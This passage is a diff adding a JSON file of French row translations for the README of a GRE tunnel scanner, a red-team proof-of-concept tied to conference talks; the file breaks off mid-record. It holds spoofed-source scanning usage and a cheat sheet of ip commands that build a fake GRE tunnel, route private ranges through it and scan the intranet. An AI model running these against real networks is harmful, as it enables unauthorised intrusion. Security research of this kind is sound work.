@@ -1,0 +1,907 @@
+[
+  {
+    "Id": 1,
+    "Content": "# GRE tunnel Scanner\n## ⚠️⚠️⚠️ IMPORTANT ⚠️⚠️⚠️\n### ⚠️This tool includes spoofing source IP addresses. Please ensure you have legal authorization to use it.⚠️\n## Reference\n- This is a PoC code for Talks: From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion\n    - [Black Hat USA 2025 Briefing](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)\n    - [DEF CON 33 Main Stage](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)\n    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)\n## Prepare\n- `pip3 install requirement.txt`\n## Usage",
+    "ContentSha": "N1nEFyfFkdZ2J8U3muVDxjD9pk+VC06lpmlfPCb+2pA=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "# Scanner de tunnel GRE\n## ⚠️⚠️⚠️ IMPORTANT ⚠️⚠️⚠️\n### ⚠️Cet outil inclut la falsification des adresses IP source. Veuillez vous assurer que vous disposez d'une autorisation légale pour l'utiliser.⚠️\n## Référence\n- Ceci est un code PoC pour les conférences : From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion\n    - [Black Hat USA 2025 Briefing](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)\n    - [DEF CON 33 Main Stage](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)\n    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)\n## Préparation\n- `pip3 install requirement.txt`\n## Utilisation",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "veWLmgpwu1eQX7Eqog/hSxHaqkHRJvAGGs+TSHvurkk=",
+        "originContent": "# GRE tunnel Scanner",
+        "translatedContent": "# Scanner de tunnel GRE"
+      },
+      {
+        "row": 2,
+        "rowsha": "1/EhBFwmb/9+Il/ZNxhK2rh//L88uFM+Py2J1xPnavY=",
+        "originContent": "## ⚠️⚠️⚠️ IMPORTANT ⚠️⚠️⚠️",
+        "translatedContent": "## ⚠️⚠️⚠️ IMPORTANT ⚠️⚠️⚠️"
+      },
+      {
+        "row": 3,
+        "rowsha": "+UJLcDuaQocQUS1IgE/FI6idPRLN4mvVI+bsGMlzf7g=",
+        "originContent": "### ⚠️This tool includes spoofing source IP addresses. Please ensure you have legal authorization to use it.⚠️",
+        "translatedContent": "### ⚠️Cet outil inclut la falsification des adresses IP source. Veuillez vous assurer que vous disposez d'une autorisation légale pour l'utiliser.⚠️"
+      },
+      {
+        "row": 4,
+        "rowsha": "6NGYQpw1+hCEjm7/IVTP/AwAmNUG6wXkiJgGDwT1RrE=",
+        "originContent": "## Reference",
+        "translatedContent": "## Référence"
+      },
+      {
+        "row": 5,
+        "rowsha": "LjipWo+ZUeUyCmczcYAsGpVnSnDF2fqogJCMpJg1C8s=",
+        "originContent": "- This is a PoC code for Talks: From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion",
+        "translatedContent": "- Ceci est un code PoC pour les conférences : From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion"
+      },
+      {
+        "row": 6,
+        "rowsha": "FmRclq0kfbYP8dqNk9/MZGK3liNCej7KYFRP8H5GLIs=",
+        "originContent": "    - [Black Hat USA 2025 Briefing](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)",
+        "translatedContent": "    - [Black Hat USA 2025 Briefing](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)"
+      },
+      {
+        "row": 7,
+        "rowsha": "/nee5j9JeHYe1VVlIu8xCZe6JK6tgVvaA8+tcgf1pBU=",
+        "originContent": "    - [DEF CON 33 Main Stage](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)",
+        "translatedContent": "    - [DEF CON 33 Main Stage](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)"
+      },
+      {
+        "row": 8,
+        "rowsha": "Vdr3Shu9hUg5uhbGK3pYnPmdJZKx9T84NImUyexAw74=",
+        "originContent": "    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)",
+        "translatedContent": "    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)"
+      },
+      {
+        "row": 9,
+        "rowsha": "X5ZgLhH/ZEELtjDAtgY6eP+eDyUK/AiAoEkOgQDLy2A=",
+        "originContent": "## Prepare",
+        "translatedContent": "## Préparation"
+      },
+      {
+        "row": 10,
+        "rowsha": "rAQr5IVVFQptJSce6YgWp6vrSM5ZeB1edGzkEmEAgnk=",
+        "originContent": "- `pip3 install requirement.txt`",
+        "translatedContent": "- `pip3 install requirement.txt`"
+      },
+      {
+        "row": 11,
+        "rowsha": "Y7/WGgVhslWiyqCi463Qkcp+Mn8voGpAfLsv80G4WNg=",
+        "originContent": "## Usage",
+        "translatedContent": "## Utilisation"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 2,
+    "Content": "```\npython3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile>\n```",
+    "ContentSha": "IIDsdUO8rpsX/PCxLOExN/4EwtBjy+GsCNGsu5YDxJ4=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\npython3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile>\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "gpQ8sPiIKsekhQ5HCT+UBZpoxbm4vHlj1cpmJjX1aUc=",
+        "originContent": "python3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile>",
+        "translatedContent": "python3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile>"
+      },
+      {
+        "row": 3,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 3,
+    "Content": "## Example\n- for example `1.1.1.1` and `2.2.2.2` has gre tunnel you are `3.3.3.3`",
+    "ContentSha": "OmPS+KzbAwBMcZplOC81lyuZpU2jszFQ1d+cT4uxgpo=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "## Exemple\n- par exemple `1.1.1.1` et `2.2.2.2` ont un tunnel gre, vous êtes `3.3.3.3`",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "m/NPRMnRNx9O2lad+gT/eDCv+Bz6gWRuaAzvCHcUzcE=",
+        "originContent": "## Example",
+        "translatedContent": "## Exemple"
+      },
+      {
+        "row": 2,
+        "rowsha": "cJoPO8s5IzNPxuF/r+V/pQudtZBSpn/Vh5+kx5b8d5o=",
+        "originContent": "- for example `1.1.1.1` and `2.2.2.2` has gre tunnel you are `3.3.3.3`",
+        "translatedContent": "- par exemple `1.1.1.1` et `2.2.2.2` ont un tunnel gre, vous êtes `3.3.3.3`"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 4,
+    "Content": "```\npython3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2\nINFO - sending gresrc 1.1.1.1, gredst 2.2.2.2\nCRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1\n```",
+    "ContentSha": "hCYO3Nz/7++i2HRTv2mtKAiXuUO0FbZ03XD2ZCuablg=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\npython3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2\nINFO - sending gresrc 1.1.1.1, gredst 2.2.2.2\nCRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "F7R/cSGzMRDQ7FHmNO/83tqFsCvv5xwgDpLqKVd3A14=",
+        "originContent": "python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2",
+        "translatedContent": "python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2"
+      },
+      {
+        "row": 3,
+        "rowsha": "gScofD8qk0aDW4L0cdXh3RRARdCPrIr04v57mPZNNLY=",
+        "originContent": "INFO - sending gresrc 1.1.1.1, gredst 2.2.2.2",
+        "translatedContent": "INFO - sending gresrc 1.1.1.1, gredst 2.2.2.2"
+      },
+      {
+        "row": 4,
+        "rowsha": "WggYQKCov+sHWUnp7Z1bZHXsbJSyw2dcuJg11UBmlF8=",
+        "originContent": "CRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1",
+        "translatedContent": "CRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1"
+      },
+      {
+        "row": 5,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 5,
+    "Content": "- And get how to abuse GRE tunnel",
+    "ContentSha": "XRNONHWeqKjB0SOKXu6oMzlYnJhMudP+a+gp9R4rOss=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "- Et comprendre comment exploiter un tunnel GRE",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "XRNONHWeqKjB0SOKXu6oMzlYnJhMudP+a+gp9R4rOss=",
+        "originContent": "- And get how to abuse GRE tunnel",
+        "translatedContent": "- Et comprendre comment exploiter un tunnel GRE"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 6,
+    "Content": "```\npython3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3\n########################## output ##########################\n#### Create Fake Tunnel ####\nIFACE=eth0\nMYPUBIP=3.3.3.3\nSRCADDR=1.1.1.1\nDSTADDR=2.2.2.2\nip addr add  $SRCADDR/32 dev $IFACE\nip r add $DSTADDR dev $IFACE src $SRCADDR\nip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255\nip link set gre1 up mtu 1280\n\n## route possible private ip ##\nip r add 10.0.0.0/8 dev gre1 src $MYPUBIP\nip r add 172.16.0.0/12 dev gre1 src $MYPUBIP\nip r add 192.168.0.0/16 dev gre1 src $MYPUBIP\n\n### start scan intranet ###\n#### !IMPORTANT! ####\n# !! nmap is not available for this kind of attack use fping instead !! #\n# fping -g 192.168.0.0/16\n\n### cleanup ###\nip addr del $SRCADDR/32 dev $IFACE\nip tunnel del gre1\n```",
+    "ContentSha": "Zezw5ZVTWubjk6ClCCaPFmAlbXE2zNyUqDHsMRkjv44=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\npython3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3\n########################## output ##########################\n#### Create Fake Tunnel ####\nIFACE=eth0\nMYPUBIP=3.3.3.3\nSRCADDR=1.1.1.1\nDSTADDR=2.2.2.2\nip addr add  $SRCADDR/32 dev $IFACE\nip r add $DSTADDR dev $IFACE src $SRCADDR\nip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255\nip link set gre1 up mtu 1280\n\n## route possible private ip ##\nip r add 10.0.0.0/8 dev gre1 src $MYPUBIP\nip r add 172.16.0.0/12 dev gre1 src $MYPUBIP\nip r add 192.168.0.0/16 dev gre1 src $MYPUBIP\n\n### start scan intranet ###\n#### !IMPORTANT! ####\n# !! nmap is not available for this kind of attack use fping instead !! #\n# fping -g 192.168.0.0/16\n\n### cleanup ###\nip addr del $SRCADDR/32 dev $IFACE\nip tunnel del gre1\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "dYyvfqo0UuCY5Y0lPjwd15p/3ji0JxrebCCuHugYstw=",
+        "originContent": "python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3",
+        "translatedContent": "python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3"
+      },
+      {
+        "row": 3,
+        "rowsha": "Az4Q20D8ebLNUtAT1Vb2Abbsl2TZ0Zgr3a0wIfpj2eA=",
+        "originContent": "########################## output ##########################",
+        "translatedContent": "########################## output ##########################"
+      },
+      {
+        "row": 4,
+        "rowsha": "3CWAFUc9eJ0pMtKZDV1Rg/oX0/Kgc7A2cuhF4jwi9rk=",
+        "originContent": "#### Create Fake Tunnel ####",
+        "translatedContent": "#### Create Fake Tunnel ####"
+      },
+      {
+        "row": 5,
+        "rowsha": "m7LOhVP//wLTOXpatCO3sB7vdLc7lNoqNGKH/MPR+aw=",
+        "originContent": "IFACE=eth0",
+        "translatedContent": "IFACE=eth0"
+      },
+      {
+        "row": 6,
+        "rowsha": "Ypn6HljvEbOV5U2e4wKBwcwRm2CWtswcpakiRFJmfdI=",
+        "originContent": "MYPUBIP=3.3.3.3",
+        "translatedContent": "MYPUBIP=3.3.3.3"
+      },
+      {
+        "row": 7,
+        "rowsha": "n6dbQtIvJK7DUjLdfVBU+HY+JlCYzIRaNoqWgsWRjM4=",
+        "originContent": "SRCADDR=1.1.1.1",
+        "translatedContent": "SRCADDR=1.1.1.1"
+      },
+      {
+        "row": 8,
+        "rowsha": "j4BWxvlEQ24IZESvDGoBs+Yzufej5MtAMcOAbaGwXjU=",
+        "originContent": "DSTADDR=2.2.2.2",
+        "translatedContent": "DSTADDR=2.2.2.2"
+      },
+      {
+        "row": 9,
+        "rowsha": "31M1YdUl2A26dSyA9dGLdeRvTFrKiPMM+b6ajtl3ON8=",
+        "originContent": "ip addr add  $SRCADDR/32 dev $IFACE",
+        "translatedContent": "ip addr add  $SRCADDR/32 dev $IFACE"
+      },
+      {
+        "row": 10,
+        "rowsha": "jXSuG6+joi+tyB73IWuLhBAAKT2DLiWW7rAlLg7B5/o=",
+        "originContent": "ip r add $DSTADDR dev $IFACE src $SRCADDR",
+        "translatedContent": "ip r add $DSTADDR dev $IFACE src $SRCADDR"
+      },
+      {
+        "row": 11,
+        "rowsha": "k6SIzeaBMN6s2FatYKgmgFmfvykw2Zik3NCbCg3/ELE=",
+        "originContent": "ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255",
+        "translatedContent": "ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255"
+      },
+      {
+        "row": 12,
+        "rowsha": "UfWay+J8RDzJuHVEwHLJ57Zld/cPF72qlICahmi9NEA=",
+        "originContent": "ip link set gre1 up mtu 1280",
+        "translatedContent": "ip link set gre1 up mtu 1280"
+      },
+      {
+        "row": 13,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 14,
+        "rowsha": "By1qB6ccp3zjUUVrbsRA6pSaLOf7/sfT/ngUaxV9og8=",
+        "originContent": "## route possible private ip ##",
+        "translatedContent": "## route possible private ip ##"
+      },
+      {
+        "row": 15,
+        "rowsha": "mlz8zz3V9sAv+Prjk5xmO4hm5q+/LuQ5mBn9lPUr7uI=",
+        "originContent": "ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP",
+        "translatedContent": "ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP"
+      },
+      {
+        "row": 16,
+        "rowsha": "o0DBHYS5268P9KnxrpcsWGJ8mqweCUSEqdXwTISD7U0=",
+        "originContent": "ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP",
+        "translatedContent": "ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP"
+      },
+      {
+        "row": 17,
+        "rowsha": "eRqyOungzw0CbQIBGyKNw2f+6lQw32POO32dAg74R4o=",
+        "originContent": "ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP",
+        "translatedContent": "ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP"
+      },
+      {
+        "row": 18,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 19,
+        "rowsha": "Ene943xjXFggnkdEgavzwiX29FfBCR0hOr/EabhIyuA=",
+        "originContent": "### start scan intranet ###",
+        "translatedContent": "### start scan intranet ###"
+      },
+      {
+        "row": 20,
+        "rowsha": "SN+dgrP7ZWt+SxXfsEMtFH4JaLvOEe9XZK9viki1R2A=",
+        "originContent": "#### !IMPORTANT! ####",
+        "translatedContent": "#### !IMPORTANT! ####"
+      },
+      {
+        "row": 21,
+        "rowsha": "1B4h7jfc34ZcIruszvq77FBrgRL2b1Z/sA/ZUSfUmio=",
+        "originContent": "# !! nmap is not available for this kind of attack use fping instead !! #",
+        "translatedContent": "# !! nmap is not available for this kind of attack use fping instead !! #"
+      },
+      {
+        "row": 22,
+        "rowsha": "VRCIESgq/pgNqSgvXNHeawp/V/HX5xan8ODYhvQMIIM=",
+        "originContent": "# fping -g 192.168.0.0/16",
+        "translatedContent": "# fping -g 192.168.0.0/16"
+      },
+      {
+        "row": 23,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 24,
+        "rowsha": "wNyvxp6igZI4e3NjOVRtvSEfgGfjbko0LRL6XAUcZSs=",
+        "originContent": "### cleanup ###",
+        "translatedContent": "### cleanup ###"
+      },
+      {
+        "row": 25,
+        "rowsha": "ZsAUVOX1se6jBJHtoVICG9GSZ1lmvCazyqpuJHYnqlw=",
+        "originContent": "ip addr del $SRCADDR/32 dev $IFACE",
+        "translatedContent": "ip addr del $SRCADDR/32 dev $IFACE"
+      },
+      {
+        "row": 26,
+        "rowsha": "l5HfW8eyN0jJmwr/JEQ6bE1vJ6L2SuZjMlauOzfGBpw=",
+        "originContent": "ip tunnel del gre1",
+        "translatedContent": "ip tunnel del gre1"
+      },
+      {
+        "row": 27,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 7,
+    "Content": "\n- if you know the endpoint but don't know the peer address you can do somethin like this\n  - `python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8`\n  - you well get reply from 8.8.8.8 while you get the right peer\n\n- default setting about 500 package/sec.\n## options\n- `-sch`: Show Cheetsheet and exit (Input -i -lh -s -d which you found then get abuse GRE tunnel command)\n- `-l3`: Layer 3 tunnel interface (Default: False)\n- `-r`: Place GRE dest IP infomation in ICMP (Default: Place GRE src IP infomation)\n- `-ss`: Save and use status file (the last scan will resume) (Default: False)\n  - Recommend \"on\" in mass scan system sometime kill the script\n- `-i <interface>`: Interface to send package\n- `-s <ip_or_file>`: A IP subnet or a list of IPs(subnets) to use as GRE src\n- `-d <ip_or_file>`: A IP subnet or a list of IPs(subnets) to use as GRE dst\n- `-L <file>`: scan a list of GRE peers\n  - file every line look like this `1.1.1.1,2.2.2.2`\n- `-lh <ip>`: A IP on your pubilc interface (the IP on -i interface)\n- `-o <file>`: Log file path\n- `-t <float>`: Wait how many second after GRE packet send (Default: 2)\n- `-T <int>`: How many thread send GRE packet in same time (Default: 255)\n- `-cs <int>`: Send how many ip until start wait for ping to responsed (default: 1000)\n- `-dp`: Do private - scan private ip GRE (Default: False)\n- `-id <ip>`: Inside ICMP dst address (Default: same as GRE dst) \n  - Use this if you know the inside intranet address\n- `-v <log_level>`: Logging level `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']` (Default: INFO)\n  - GRE peer found log is on `CRITICAL`\n\n\n## better way to scan full public ip",
+    "ContentSha": "x/3JchcnKhret4Ly4vSDSL2WUhdvWNcHIFgFgC3qQvY=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "\n- si vous connaissez le point de terminaison mais pas l'adresse du pair, vous pouvez faire quelque chose comme ceci  \n  - `python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8`  \n  - vous recevrez une réponse de 8.8.8.8 tout en obtenant le bon pair  \n\n- réglage par défaut environ 500 paquets/seconde.  \n## options  \n- `-sch` : Affiche la feuille de triche et quitte (Entrez -i -lh -s -d que vous avez trouvé puis obtenez la commande d'abus du tunnel GRE)  \n- `-l3` : Interface tunnel couche 3 (Par défaut : Faux)  \n- `-r` : Place l’IP de destination GRE dans ICMP (Par défaut : Place l’IP source GRE)  \n- `-ss` : Sauvegarde et utilise un fichier d’état (la dernière analyse reprendra) (Par défaut : Faux)  \n  - Recommandé \"on\" dans un système de scan massif, parfois le script plante  \n- `-i <interface>` : Interface pour envoyer les paquets  \n- `-s <ip_ou_fichier>` : Un sous-réseau IP ou une liste d’IPs (sous-réseaux) à utiliser comme source GRE  \n- `-d <ip_ou_fichier>` : Un sous-réseau IP ou une liste d’IPs (sous-réseaux) à utiliser comme destination GRE  \n- `-L <fichier>` : scanner une liste de pairs GRE  \n  - fichier, chaque ligne ressemble à ceci `1.1.1.1,2.2.2.2`  \n- `-lh <ip>` : Une IP sur votre interface publique (l’IP sur l’interface -i)  \n- `-o <fichier>` : Chemin du fichier log  \n- `-t <float>` : Attendre combien de secondes après l’envoi du paquet GRE (Par défaut : 2)  \n- `-T <int>` : Combien de threads envoient des paquets GRE en même temps (Par défaut : 255)  \n- `-cs <int>` : Envoyer combien d’IPs avant de commencer à attendre la réponse ping (par défaut : 1000)  \n- `-dp` : Faire privé - scanner les IP privées GRE (Par défaut : Faux)  \n- `-id <ip>` : Adresse destination dans ICMP (Par défaut : même que la destination GRE)  \n  - Utilisez ceci si vous connaissez l’adresse intranet interne  \n- `-v <niveau_log>` : Niveau de log `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']` (Par défaut : INFO)  \n  - Le log de détection de pair GRE est sur `CRITICAL`  \n\n\n## meilleure façon de scanner l’IP publique complète",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 2,
+        "rowsha": "aWO94WW0FoAxV9Huy1GEVPTzFMzkFr2KsrHU564g4VU=",
+        "originContent": "- if you know the endpoint but don't know the peer address you can do somethin like this",
+        "translatedContent": "- si vous connaissez le point de terminaison mais pas l'adresse du pair, vous pouvez faire quelque chose comme ceci  "
+      },
+      {
+        "row": 3,
+        "rowsha": "jMfu9dL/lcnNNHSPAD2CEp4S7NtQ3oRHVe6m/hxLlhY=",
+        "originContent": "  - `python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8`",
+        "translatedContent": "  - `python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8`  "
+      },
+      {
+        "row": 4,
+        "rowsha": "kVLwiKWEWkdf9eJrBVPogiH8T7cbm1eFG/WFZ3Nm9nA=",
+        "originContent": "  - you well get reply from 8.8.8.8 while you get the right peer",
+        "translatedContent": "  - vous recevrez une réponse de 8.8.8.8 tout en obtenant le bon pair  "
+      },
+      {
+        "row": 5,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 6,
+        "rowsha": "ytzuwkYfc16CCzfQ1F8Sou/gVO+43udpGZ6TmNtu9v0=",
+        "originContent": "- default setting about 500 package/sec.",
+        "translatedContent": "- réglage par défaut environ 500 paquets/seconde.  "
+      },
+      {
+        "row": 7,
+        "rowsha": "3pCCBU1tW/vo4hTaf38EtGplMIwmYydMyT7Ypo6QLW8=",
+        "originContent": "## options",
+        "translatedContent": "## options  "
+      },
+      {
+        "row": 8,
+        "rowsha": "4JdN/d6yIBgVTyyuxvx1DFUA5U3RaCihm5HyRO/HPgU=",
+        "originContent": "- `-sch`: Show Cheetsheet and exit (Input -i -lh -s -d which you found then get abuse GRE tunnel command)",
+        "translatedContent": "- `-sch` : Affiche la feuille de triche et quitte (Entrez -i -lh -s -d que vous avez trouvé puis obtenez la commande d'abus du tunnel GRE)  "
+      },
+      {
+        "row": 9,
+        "rowsha": "YppMShft/QPGVRrI805I/i5oFhXRTLhgAnWPm4em4ls=",
+        "originContent": "- `-l3`: Layer 3 tunnel interface (Default: False)",
+        "translatedContent": "- `-l3` : Interface tunnel couche 3 (Par défaut : Faux)  "
+      },
+      {
+        "row": 10,
+        "rowsha": "Sl4n+5pvSMYT2uMVvk1ntPUj552s/wNOnreBhybDgYo=",
+        "originContent": "- `-r`: Place GRE dest IP infomation in ICMP (Default: Place GRE src IP infomation)",
+        "translatedContent": "- `-r` : Place l’IP de destination GRE dans ICMP (Par défaut : Place l’IP source GRE)  "
+      },
+      {
+        "row": 11,
+        "rowsha": "3+yr3Zgeg2P0aPuQondNmibGi7rxrlrWUp4wPB2+fqc=",
+        "originContent": "- `-ss`: Save and use status file (the last scan will resume) (Default: False)",
+        "translatedContent": "- `-ss` : Sauvegarde et utilise un fichier d’état (la dernière analyse reprendra) (Par défaut : Faux)  "
+      },
+      {
+        "row": 12,
+        "rowsha": "2F1FbQBDXw7XvdegW8o4SW0F7402CFuT+4PSgV+acmY=",
+        "originContent": "  - Recommend \"on\" in mass scan system sometime kill the script",
+        "translatedContent": "  - Recommandé \"on\" dans un système de scan massif, parfois le script plante  "
+      },
+      {
+        "row": 13,
+        "rowsha": "cxqETyCU3jkm8uyWZGxDI4Lp6Vd7o/VqdWZjzMiGkkQ=",
+        "originContent": "- `-i <interface>`: Interface to send package",
+        "translatedContent": "- `-i <interface>` : Interface pour envoyer les paquets  "
+      },
+      {
+        "row": 14,
+        "rowsha": "lZtd7+sHnboEoZj8o+BVVz0QAXjBfr61uaHcUmbkwDY=",
+        "originContent": "- `-s <ip_or_file>`: A IP subnet or a list of IPs(subnets) to use as GRE src",
+        "translatedContent": "- `-s <ip_ou_fichier>` : Un sous-réseau IP ou une liste d’IPs (sous-réseaux) à utiliser comme source GRE  "
+      },
+      {
+        "row": 15,
+        "rowsha": "gY8wXXvpgEVI73xSQDOmbQEg62s8HuOnIj3dUgnRRkw=",
+        "originContent": "- `-d <ip_or_file>`: A IP subnet or a list of IPs(subnets) to use as GRE dst",
+        "translatedContent": "- `-d <ip_ou_fichier>` : Un sous-réseau IP ou une liste d’IPs (sous-réseaux) à utiliser comme destination GRE  "
+      },
+      {
+        "row": 16,
+        "rowsha": "7ZcUMngODL/yQH+0mdGasKQMyS6Hb+WTOLvZEmtWMtQ=",
+        "originContent": "- `-L <file>`: scan a list of GRE peers",
+        "translatedContent": "- `-L <fichier>` : scanner une liste de pairs GRE  "
+      },
+      {
+        "row": 17,
+        "rowsha": "INXMPmurgguOgW24qTac79fdx3k7GXeB5CqSUI722SI=",
+        "originContent": "  - file every line look like this `1.1.1.1,2.2.2.2`",
+        "translatedContent": "  - fichier, chaque ligne ressemble à ceci `1.1.1.1,2.2.2.2`  "
+      },
+      {
+        "row": 18,
+        "rowsha": "QNQTILrz5oQDyz8ex1v8hjmQMnj3nOjf/DYTLAjdqtg=",
+        "originContent": "- `-lh <ip>`: A IP on your pubilc interface (the IP on -i interface)",
+        "translatedContent": "- `-lh <ip>` : Une IP sur votre interface publique (l’IP sur l’interface -i)  "
+      },
+      {
+        "row": 19,
+        "rowsha": "YipWpw62J8TuM27g9sesgHr41OJTlX5pc8UfdF78sxA=",
+        "originContent": "- `-o <file>`: Log file path",
+        "translatedContent": "- `-o <fichier>` : Chemin du fichier log  "
+      },
+      {
+        "row": 20,
+        "rowsha": "TPfqwcSmhyHBsLoRIwgB3pBgUX+RAnaVFUpoWHMURdw=",
+        "originContent": "- `-t <float>`: Wait how many second after GRE packet send (Default: 2)",
+        "translatedContent": "- `-t <float>` : Attendre combien de secondes après l’envoi du paquet GRE (Par défaut : 2)  "
+      },
+      {
+        "row": 21,
+        "rowsha": "6v8OEt+hLa7N6I1hcjGOaHaSmDXFq3ZWhB9Nf5jH5J4=",
